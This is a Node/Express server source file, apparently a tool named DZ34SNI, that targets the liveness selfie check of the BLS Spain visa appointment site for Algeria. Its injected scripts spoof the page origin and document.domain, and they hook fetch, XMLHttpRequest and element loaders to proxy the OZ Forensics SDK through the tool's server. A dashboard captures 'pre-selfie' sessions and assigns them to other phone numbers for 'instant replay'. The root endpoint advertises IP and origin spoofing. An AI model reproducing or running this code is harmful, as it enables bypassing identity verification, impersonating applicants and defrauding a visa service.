                Object.defineProperty(el, 'href', {
                    set: function(v) { d2.set.call(this, rw(v)); },
                    get: function() { return d2.get.call(this); },
                    configurable: true
                });
            }
        }
        return el;
    };

    var _Im = window.Image;
    window.Image = function(w, h) {
        var img = new _Im(w, h);
        var d = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
        if (d && d.set) {
            Object.defineProperty(img, 'src', {
                set: function(v) { d.set.call(this, rw(v)); },
                get: function() { return d.get.call(this); },
                configurable: true
            });
        }
        return img;
    };
    window.Image.prototype = _Im.prototype;

    document.getElementById('st').textContent = 'Proxy capture OK — chargement SDK...';
    console.log('[DZ34SNI] Pre-selfie capture proxy: ' + PB);
})();
</script>

<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
    <input type="hidden" name="event_session_id" id="event_session_id" value="">
    <input type="hidden" name="LivenessId" id="LivenessId" value="">
</form>

<!-- Load OZ SDK -->
<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>

<!-- Launch and capture -->
<script>
var __cs = '${captureSession}', __srv = '${serverUrl}', __label = '${safeLabel}', __phone = '${safePhone}', __linkId = '${esc(linkId)}', __sent = false;

function savePreselfie(sid) {
    if (__sent) return; __sent = true;
    document.getElementById('st').textContent = 'Sauvegarde du pre-selfie...';

    var url = __srv + '/api/preselfie/save';
    var body = JSON.stringify({
        captureSession: __cs,
        label: __label,
        phone: __phone,
        sessionId: sid
    });

    fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: body, cache: 'no-store' })
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.ok) {
                document.getElementById('ok-detail').textContent = '"' + __label + '" — ' + d.captureCount + ' requêtes capturées';
                document.getElementById('ok-count').textContent = 'ID: ' + d.id;
                document.getElementById('ok-screen').style.display = 'flex';
                document.getElementById('st').textContent = 'Pre-selfie sauvegardé !';
                console.log('[DZ34SNI] Pre-selfie saved:', d.id);
            } else {
                document.getElementById('st').textContent = 'ERREUR: ' + (d.error || 'save failed');
            }
        })
        .catch(function(e) {
            document.getElementById('st').textContent = 'ERREUR: ' + e.message;
        });
}

window.addEventListener('load', function() {
    document.getElementById('st').textContent = 'SDK chargé — lancement selfie...';

    setTimeout(function() {
        var ld = document.getElementById('ld'); if (ld) ld.style.display = 'none';
        try {
            if (typeof OzLiveness === 'undefined') {
                document.getElementById('st').textContent = 'ERREUR: SDK non chargé';
                return;
            }
            document.getElementById('st').textContent = 'Selfie en cours — REGARDEZ LA CAMERA...';
            OzLiveness.open({
                lang: 'en',
                meta: { 'user_id': '${tempUserId}', 'transaction_id': '${tempTransactionId}' },
                overlay_options: false,
                action: ['video_selfie_blank'],
                result_mode: 'safe',
                on_complete: function(r) {
                    var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                    if (sid) {
                        try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                        savePreselfie(sid);
                    } else {
                        document.getElementById('st').textContent = 'ERREUR: pas de session ID';
                    }
                },
                on_error: function(e) {
                    var msg = e && e.message ? e.message : String(e);
                    document.getElementById('st').textContent = 'Erreur: ' + msg;
                }
            });
        } catch(e) {
            document.getElementById('st').textContent = 'Erreur: ' + e.message;
        }
    }, 2500);
});
</script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
});

// ═══════════════════════════════════════════════════
// ★ DASHBOARD ★
// ═══════════════════════════════════════════════════

app.get('/dashboard', (req, res) => {
    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';
    
    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>DZ34SNI — Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f172a;font-family:system-ui,sans-serif;min-height:100vh;color:#f1f5f9}
.top{background:linear-gradient(135deg,#dc2626 0%,#b91c1c 50%,#991b1b 100%);padding:20px;text-align:center}
.top h1{font-size:24px;font-weight:900;color:#fff;letter-spacing:1px}
.top p{font-size:12px;color:rgba(255,255,255,.7);margin-top:4px}
.container{max-width:900px;margin:0 auto;padding:16px}
.section{background:#1e293b;border-radius:14px;border:1px solid #334155;margin-bottom:16px;overflow:hidden}
.section-head{background:#334155;padding:14px 18px;font-size:15px;font-weight:800;display:flex;align-items:center;gap:8px}
.section-body{padding:18px}
.form-row{display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap}
.form-row input{flex:1;min-width:120px;padding:10px 14px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#f1f5f9;font-size:14px;outline:none}
.form-row input:focus{border-color:#dc2626}
.btn{padding:10px 18px;border:none;border-radius:8px;font-weight:700;cursor:pointer;font-size:13px;transition:.2s}
.btn-red{background:#dc2626;color:#fff}.btn-red:hover{background:#b91c1c}
.btn-green{background:#059669;color:#fff}.btn-green:hover{background:#047857}
.btn-blue{background:#2563eb;color:#fff}.btn-blue:hover{background:#1d4ed8}
.btn-gray{background:#475569;color:#fff}.btn-gray:hover{background:#334155}
.btn-sm{padding:6px 12px;font-size:11px}
.table{width:100%;border-collapse:collapse}
.table th{text-align:left;padding:8px 12px;font-size:11px;color:#94a3b8;text-transform:uppercase;border-bottom:1px solid #334155}
.table td{padding:10px 12px;font-size:13px;border-bottom:1px solid #1e293b}
.badge{display:inline-block;padding:2px 8px;border-radius:6px;font-size:10px;font-weight:700}
.badge-green{background:#065f46;color:#34d399}
.badge-yellow{background:#713f12;color:#fbbf24}
.badge-red{background:#7f1d1d;color:#fca5a5}
.empty{text-align:center;padding:30px;color:#64748b;font-size:14px}
#toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#059669;color:#fff;padding:12px 24px;border-radius:10px;font-weight:700;font-size:14px;display:none;z-index:99999;box-shadow:0 4px 20px rgba(0,0,0,.5)}
.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:16px}
.stat-card{background:#0f172a;border-radius:10px;padding:14px;text-align:center;border:1px solid #334155}
.stat-card .num{font-size:28px;font-weight:900;color:#dc2626}
.stat-card .lbl{font-size:11px;color:#94a3b8;margin-top:4px}
</style>
</head>
<body>

<div class="top">
    <h1>🐉 DZ34SNI DASHBOARD</h1>
    <p>Pre-Selfie Manager — Instant Replay System</p>
</div>

<div class="container">

    <!-- Stats -->
    <div class="stat-grid">
        <div class="stat-card"><div class="num" id="s-preselfies">0</div><div class="lbl">Pre-Selfies</div></div>
        <div class="stat-card"><div class="num" id="s-tasks">0</div><div class="lbl">Active Tasks</div></div>
        <div class="stat-card"><div class="num" id="s-results">0</div><div class="lbl">Results</div></div>
        <div class="stat-card"><div class="num" id="s-mappings">0</div><div class="lbl">Phone Mappings</div></div>
    </div>

    <!-- New Pre-Selfie -->
    <div class="section">
        <div class="section-head">📸 Nouveau Pre-Selfie</div>
        <div class="section-body">
            <div class="form-row">
                <input type="text" id="new-label" placeholder="Nom / Label (ex: Ahmed)">
                <input type="text" id="new-phone" placeholder="Téléphone (optionnel)">
            </div>
            <button class="btn btn-red" onclick="startPreselfie()">🎥 Lancer le Pre-Selfie</button>
            <p style="font-size:11px;color:#94a3b8;margin-top:8px">Le selfie sera capturé et sauvegardé pour utilisation future</p>
        </div>
    </div>

    <!-- Pre-Selfies List -->
    <div class="section">
        <div class="section-head">💾 Pre-Selfies Sauvegardés <button class="btn btn-gray btn-sm" onclick="refresh()" style="margin-left:auto">🔄 Refresh</button></div>
        <div class="section-body" id="ps-list">
            <div class="empty">Chargement...</div>
        </div>
    </div>

    <!-- Quick Assign -->
    <div class="section">
        <div class="section-head">🔗 Assigner un Pre-Selfie à un Numéro</div>
        <div class="section-body">
            <div class="form-row">
                <input type="text" id="assign-phone" placeholder="Numéro du client">
                <select id="assign-ps" style="flex:1;min-width:120px;padding:10px;border-radius:8px;border:1px solid #475569;background:#0f172a;color:#f1f5f9;font-size:14px"></select>
            </div>
            <button class="btn btn-blue" onclick="assignPreselfie()">🔗 Assigner</button>
        </div>
    </div>

    <!-- Active Mappings -->
    <div class="section">
        <div class="section-head">📱 Mappings Téléphone → Pre-Selfie</div>
        <div class="section-body" id="map-list">
            <div class="empty">Aucun mapping</div>
        </div>
    </div>

</div>

<div id="toast"></div>

<script>
var SRV = '${serverUrl}';
var allPreselfies = [];

function toast(msg, ok) {
    var t = document.getElementById('toast');
    t.textContent = msg;
    t.style.background = ok ? '#059669' : '#dc2626';
    t.style.display = 'block';
    setTimeout(function() { t.style.display = 'none'; }, 3000);
}

function startPreselfie() {
    var label = document.getElementById('new-label').value.trim();
    if (!label) { toast('Entrez un nom/label', false); return; }
    var phone = document.getElementById('new-phone').value.trim();
    var url = SRV + '/pre-selfie?label=' + encodeURIComponent(label);
    if (phone) url += '&phone=' + encodeURIComponent(phone);
    window.open(url, '_blank');
}

async function refresh() {
    try {
        // Pre-selfies
        var r = await fetch(SRV + '/api/preselfies', { cache: 'no-store' });
        var d = await r.json();
        allPreselfies = d.preselfies || [];
        renderPreselfies(allPreselfies, d.mappings || {});

        // Stats
        var r2 = await fetch(SRV + '/debug', { cache: 'no-store' });
        var d2 = await r2.json();
        document.getElementById('s-preselfies').textContent = allPreselfies.length;
        document.getElementById('s-tasks').textContent = (d2.tasks || []).length;
        document.getElementById('s-results').textContent = (d2.results || []).length;
        document.getElementById('s-mappings').textContent = Object.keys(d.mappings || {}).length;

        // Update assign dropdown
        var sel = document.getElementById('assign-ps');
        sel.innerHTML = '<option value="">— Choisir —</option>';
        allPreselfies.forEach(function(ps) {
            sel.innerHTML += '<option value="' + ps.id + '">' + ps.label + ' (' + ps.captureCount + ' req)</option>';
        });

    } catch(e) {
        toast('Erreur: ' + e.message, false);
    }
}

function renderPreselfies(list, mappings) {
    var el = document.getElementById('ps-list');
    if (!list.length) { el.innerHTML = '<div class="empty">Aucun pre-selfie. Cliquez "Lancer" ci-dessus.</div>'; return; }

    // Reverse mappings: id → phones
    var idPhones = {};
    for (var ph in mappings) { var id = mappings[ph]; if (!idPhones[id]) idPhones[id] = []; idPhones[id].push(ph); }

    var html = '<table class="table"><thead><tr><th>Label</th><th>Captures</th><th>Tél</th><th>Utilisé</th><th>Status</th><th>Actions</th></tr></thead><tbody>';
    list.forEach(function(ps) {
        var phones = (idPhones[ps.id] || []).join(', ') || ps.phone || '—';
        var age = ps.age || '—';
        var badge = ps.status === 'ready' ? '<span class="badge badge-green">READY</span>' : '<span class="badge badge-yellow">' + ps.status + '</span>';
        var used = ps.useCount > 0 ? ps.useCount + 'x' : '—';
        html += '<tr>'
            + '<td><b>' + ps.label + '</b><br><span style="font-size:10px;color:#64748b">' + ps.id + '</span></td>'
            + '<td>' + ps.captureCount + ' req</td>'
            + '<td style="font-size:12px">' + phones + '</td>'
            + '<td>' + used + '</td>'
            + '<td>' + badge + '</td>'
            + '<td>'
            + '<button class="btn btn-red btn-sm" onclick="deletePs(\\'' + ps.id + '\\')">🗑️</button> '
            + '</td></tr>';
    });
    html += '</tbody></table>';
    el.innerHTML = html;

    // Mappings
    var mapEl = document.getElementById('map-list');
    var mapKeys = Object.keys(mappings);
    if (!mapKeys.length) { mapEl.innerHTML = '<div class="empty">Aucun mapping</div>'; return; }
    var mh = '<table class="table"><thead><tr><th>Téléphone</th><th>Pre-Selfie</th><th>Action</th></tr></thead><tbody>';
    mapKeys.forEach(function(ph) {
        var psId = mappings[ph];
        var ps = list.find(function(p) { return p.id === psId; });
        mh += '<tr><td><b>' + ph + '</b></td><td>' + (ps ? ps.label : psId) + '</td>'
            + '<td><button class="btn btn-gray btn-sm" onclick="unassign(\\'' + ph + '\\')">❌ Retirer</button></td></tr>';
    });
    mh += '</tbody></table>';
    mapEl.innerHTML = mh;
}

async function deletePs(id) {
    if (!confirm('Supprimer ce pre-selfie ?')) return;
    try {
        await fetch(SRV + '/api/preselfie/' + id, { method: 'DELETE' });
        toast('Supprimé !', true);
        refresh();
    } catch(e) { toast('Erreur', false); }
}

async function assignPreselfie() {
    var phone = document.getElementById('assign-phone').value.trim();
    var id = document.getElementById('assign-ps').value;
    if (!phone || !id) { toast('Remplissez tous les champs', false); return; }
    try {
        await fetch(SRV + '/api/preselfie/assign', {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ id: id, phone: phone })
        });
        toast('Assigné !', true);
        document.getElementById('assign-phone').value = '';
        refresh();
    } catch(e) { toast('Erreur', false); }
}

async function unassign(phone) {
    try {
        await fetch(SRV + '/api/preselfie/unassign', {
            method: 'POST', headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ phone: phone })
        });
        toast('Mapping retiré', true);
        refresh();
    } catch(e) { toast('Erreur', false); }
}

// Auto-refresh
refresh();
setInterval(refresh, 10000);
</script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
});

// ═══════════════════════════════════════════
// OZ-PAGE — Original (kept for normal flow)
// ═══════════════════════════════════════════

app.get('/oz-page', (req, res) => {
    const { userId, transactionId, realIp, phone } = req.query;

    const esc = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
    const uid = esc(userId);
    const tid = esc(transactionId);
    const ip = esc(realIp);
    const ph = esc(phone);

    if (phone && realIp) phoneIpMap[phone] = realIp;

    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip-1.onrender.com';

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BLS Liveness</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0f172a;font-family:system-ui,sans-serif;min-height:100vh}
.ld{position:fixed;inset:0;z-index:9999;background:#0f172a;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff}
.ld .logo{width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#dc2626,#b91c1c);display:flex;align-items:center;justify-content:center;margin-bottom:16px;box-shadow:0 8px 32px rgba(220,38,38,.4)}
.ld .logo span{font-size:32px;font-weight:900}
.ld h2{font-size:18px;font-weight:700;margin-bottom:8px}
.ld p{font-size:13px;color:#94a3b8}
.ld-spin{width:40px;height:40px;border:4px solid rgba(255,255,255,.1);border-top-color:#0d9488;border-radius:50%;animation:sp .8s linear infinite;margin-top:20px}
@keyframes sp{to{transform:rotate(360deg)}}
#k2-ok{position:fixed;inset:0;z-index:2147483647;display:none;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,#059669,#0d9488,#0891b2);text-align:center;padding:30px}
.chk{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;margin-bottom:20px;animation:pop .5s ease-out}
@keyframes pop{0%{transform:scale(0);opacity:0}70%{transform:scale(1.2)}100%{transform:scale(1);opacity:1}}
#st{position:fixed;bottom:10px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.8);color:#fff;padding:8px 16px;border-radius:8px;font-size:12px;z-index:99999;text-align:center}
.ozliveness_logo,.ozliveness_version{display:none!important}
</style>
</head>
<body>

<div class="ld" id="ld">
    <div class="logo"><span>D</span></div>
    <h2>Chargement du selfie...</h2>
    <p>Preparez votre visage</p>
    <p style="margin-top:8px;font-size:11px;color:#0d9488">MODE PROXY — IP Agent</p>
    <div class="ld-spin"></div>
</div>

<div id="k2-ok">
    <div class="chk"><span style="font-size:50px;color:#fff">&#10003;</span></div>
    <p style="font-size:28px;font-weight:900;color:#fff;margin-bottom:8px">SELFIE FAIT AVEC SUCCES</p>
    <p style="font-size:16px;color:rgba(255,255,255,.8);margin-bottom:6px">\\u062a\\u0645 \\u0627\\u0644\\u062a\\u0642\\u0627\\u0637 \\u0627\\u0644\\u0633\\u064a\\u0644\\u0641\\u064a \\u0628\\u0646\\u062c\\u0627\\u062d</p>
    <p style="font-size:15px;color:rgba(255,255,255,.9);font-weight:700">Retour dans <span id="k2-c" style="background:rgba(255,255,255,.2);padding:4px 14px;border-radius:8px;font-size:22px">10</span>s</p>
</div>

<div id="st">Initialisation proxy...</div>

<script>
(function(){
    try { Object.defineProperty(window, 'origin', { value: 'https://algeria.blsspainglobal.com', writable: false, configurable: true }); } catch(e) {}
    try { Object.defineProperty(window.location, 'origin', { get: function() { return 'https://algeria.blsspainglobal.com'; }, configurable: true }); } catch(e) {}
    try { Object.defineProperty(self, 'origin', { value: 'https://algeria.blsspainglobal.com', writable: false, configurable: true }); } catch(e) {}
    try { Object.defineProperty(document, 'domain', { get: function() { return 'algeria.blsspainglobal.com'; }, configurable: true }); } catch(e) {}
})();
</script>
<script>try{history.replaceState({},'','/dza/appointment/LivenessRequest');}catch(e){}</script>

<script>
(function(){
    var PH = '${ph}';
    var PB = '${serverUrl}/oz-proxy/' + encodeURIComponent(PH) + '/';

    function rw(url) {
        if (typeof url !== 'string') return url;
        var m = url.match(/^https?:\\/\\/([^/]*ozforensics\\.com)(\\/.*)$/);
        return m ? PB + m[1] + m[2] : url;
    }

    var _f = window.fetch;
    window.fetch = function(i, o) {
        if (typeof i === 'string') i = rw(i);
        else if (i && i.url) { var u = rw(i.url); if (u !== i.url) i = new Request(u, i); }
        return _f.call(this, i, o);
    };

    var _xo = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m, u) {
        arguments[1] = rw(u);
        return _xo.apply(this, arguments);
    };

    var _ce = document.createElement.bind(document);
    document.createElement = function(tag) {
        var el = _ce(tag);
        if (tag.toLowerCase() === 'script') {
            var d = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
            if (d && d.set) {
                Object.defineProperty(el, 'src', {
                    set: function(v) { d.set.call(this, rw(v)); },
                    get: function() { return d.get.call(this); },
                    configurable: true
                });
            }
        }
        if (tag.toLowerCase() === 'link') {
            var d2 = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href');
            if (d2 && d2.set) {
                Object.defineProperty(el, 'href', {
                    set: function(v) { d2.set.call(this, rw(v)); },
                    get: function() { return d2.get.call(this); },
                    configurable: true
                });
            }
        }
        return el;
    };

    var _Im = window.Image;
    window.Image = function(w, h) {
        var img = new _Im(w, h);
        var d = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
        if (d && d.set) {
            Object.defineProperty(img, 'src', {
                set: function(v) { d.set.call(this, rw(v)); },
                get: function() { return d.get.call(this); },
                configurable: true
            });
        }
        return img;
    };
    window.Image.prototype = _Im.prototype;

    document.getElementById('st').textContent = 'Proxy OK — chargement SDK...';
    console.log('[DZ34SNI] Proxy intercept installed: ' + PB);
})();
</script>

<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
    <input type="hidden" name="event_session_id" id="event_session_id" value="">
    <input type="hidden" name="LivenessId" id="LivenessId" value="">
</form>

<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>

<script>
var __ph = '${ph}', __srv = '${serverUrl}', __sent = false;

function goBack() {
    try { __dz34sni_bridge.onGoHome(); } catch(e) { try { window.Android.onGoHome(); } catch(e2) {} }
}

function showOK() {
    var ld = document.getElementById('ld'); if (ld) ld.style.display = 'none';
    document.getElementById('st').textContent = 'Selfie OK!';
    var ok = document.getElementById('k2-ok'); if (ok) ok.style.display = 'flex';
    var c = document.getElementById('k2-c'), n = 10;
    var t = setInterval(function() { n--; if (c) c.textContent = n; if (n <= 0) { clearInterval(t); goBack(); } }, 1000);
}

function postResult(sid) {
    if (__sent) return; __sent = true;
    document.getElementById('st').textContent = 'Envoi resultat...';
    try { __dz34sni_bridge.onStatus('Envoi resultat...'); } catch(e) {}
    try { window.Android.onSelfieComplete(sid); } catch(e) {}

    var url = __srv + '/result/' + encodeURIComponent(__ph);
    var body = JSON.stringify({ event_session_id: sid, status: 'completed', realIp: '${ip}', timestamp: Date.now() });
    function go(n) {
        fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: body, cache: 'no-store' })
            .then(function() {
                console.log('[DZ34SNI] Result posted');
                try { __dz34sni_bridge.onResult(sid); } catch(e) {}
            })
            .catch(function() { if (n < 5) setTimeout(function() { go(n+1); }, 2000); });
    }
    go(0);
}

window.addEventListener('load', function() {
    document.getElementById('st').textContent = 'SDK charge — lancement...';
    try { __dz34sni_bridge.onStatus('Selfie en cours...'); } catch(e) {}

    setTimeout(function() {
        var ld = document.getElementById('ld'); if (ld) ld.style.display = 'none';
        try {
            if (typeof OzLiveness === 'undefined') {
                document.getElementById('st').textContent = 'ERREUR: SDK non charge';
                try { __dz34sni_bridge.onError('SDK not loaded'); } catch(e) {}
                try { window.Android.onSelfieError('SDK not loaded'); } catch(e) {}
                return;
            }
            document.getElementById('st').textContent = 'Selfie en cours...';
            OzLiveness.open({
                lang: 'en',
                meta: { 'user_id': '${uid}', 'transaction_id': '${tid}' },
                overlay_options: false,
                action: ['video_selfie_blank'],
                result_mode: 'safe',
                on_complete: function(r) {
                    var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                    if (sid) {
                        try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                        try { document.getElementById('LivenessId').value = sid; } catch(e) {}
                        postResult(sid);
                        showOK();
                    } else {
                        document.getElementById('st').textContent = 'ERREUR: pas de session ID';
                        try { window.Android.onSelfieError('No session ID'); } catch(e) {}
                    }
                },
                on_error: function(e) {
                    var msg = e && e.message ? e.message : String(e);
                    document.getElementById('st').textContent = 'Erreur: ' + msg;
                    try { __dz34sni_bridge.onError(msg); } catch(x) {}
                    try { window.Android.onSelfieError(msg); } catch(x) {}
                }
            });
        } catch(e) {
            document.getElementById('st').textContent = 'Erreur: ' + e.message;
            try { window.Android.onSelfieError(e.message); } catch(x) {}
        }
    }, 2500);
});
</script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
});

// ═══════════════════════════════════════════
// HEALTH & DEBUG
// ═══════════════════════════════════════════

app.get('/', (req, res) => {
    res.json({
        service: 'DZ34SNI', version: '4.0',
        status: 'running',
        features: ['oz-proxy', 'ip-spoof', 'origin-spoof', 'pre-selfie', 'instant-replay'],
        activeTasks: Object.keys(tasks).length,
        activeResults: Object.keys(results).length,
        preSelfies: Object.keys(preSelfies).length,
        phoneMappings: Object.keys(phonePreselfieMap).length,
        uptime: Math.floor(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => res.json({ ok: true }));

app.get('/debug', (req, res) => {
    res.json({
        tasks: Object.keys(tasks).map(p => ({ phone: p, realIp: tasks[p].realIp, age: Math.floor((Date.now() - tasks[p].timestamp) / 1000) + 's' })),
        results: Object.keys(results).map(p => ({ phone: p, sid: (results[p].event_session_id || '').substring(0, 15) + '...', instant: results[p].instant || false })),
        ipMap: phoneIpMap,
        preSelfies: Object.keys(preSelfies).map(id => ({ id, label: preSelfies[id].label, captures: preSelfies[id].captureCount, uses: preSelfies[id].useCount })),
        phoneMappings: phonePreselfieMap,
        captureBuffers: Object.keys(captureBuffers).map(cs => ({ session: cs, requests: captureBuffers[cs].requests.length }))
    });
});

app.listen(PORT, () => {
    console.log(`\n🐉 DZ34SNI Server v4.1 — PRE-SELFIE LINKS + INSTANT REPLAY`);
    console.log(`   Port: ${PORT}`);
    console.log(`   Features: OZ Proxy + IP Spoof + Pre-Selfie + Instant Replay`);
    console.log(`   Dashboard: /dashboard`);
    console.log(`   Ready!\n`);
});
